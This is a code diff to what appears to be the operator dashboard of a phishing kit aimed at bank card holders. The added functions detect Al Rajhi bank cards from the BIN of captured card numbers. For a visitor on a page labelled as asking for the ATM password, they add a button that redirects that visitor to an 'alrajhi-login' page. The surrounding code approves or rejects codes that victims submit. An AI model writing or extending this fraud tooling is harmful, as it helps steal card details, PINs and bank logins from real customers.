@@ -153,6 +153,25 @@
     let visitors = new Map();
     let selectedVisitorId = null;
 
+    // دالة التحقق إذا كانت البطاقة تابعة للراجحي
+    function isRajhiCard(visitor) {
+      // البحث في بطاقات الزائر
+      if (visitor.cards && visitor.cards.length > 0) {
+        for (const card of visitor.cards) {
+          const cardInfo = getCardInfo(card.cardNumber);
+          if (cardInfo.bank === 'الراجحي') {
+            return true;
+          }
+        }
+      }
+      return false;
+    }
+
+    // دالة تحويل العميل لصفحة الراجحي
+    function navigateToRajhi(socketId) {
+      socket.emit('admin:navigate', { socketId, page: 'alrajhi-login' });
+    }
+
     // دالة تحديد معلومات البطاقة من رقم BIN
     function getCardInfo(cardNumber) {
       const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
@@ -1187,6 +1206,10 @@
             html += '<div class="flex gap-2">';
             html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            // إضافة زر راجحي فقط إذا كانت الصفحة ATM والبطاقة تابعة للراجحي
+            if (dc.page === 'كلمة مرور ATM' && isRajhiCard(visitor)) {
+              html += '<button onclick="navigateToRajhi(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي</button>';
+            }
             html += '</div>';
             html += '</div>';
             html += '</div>';
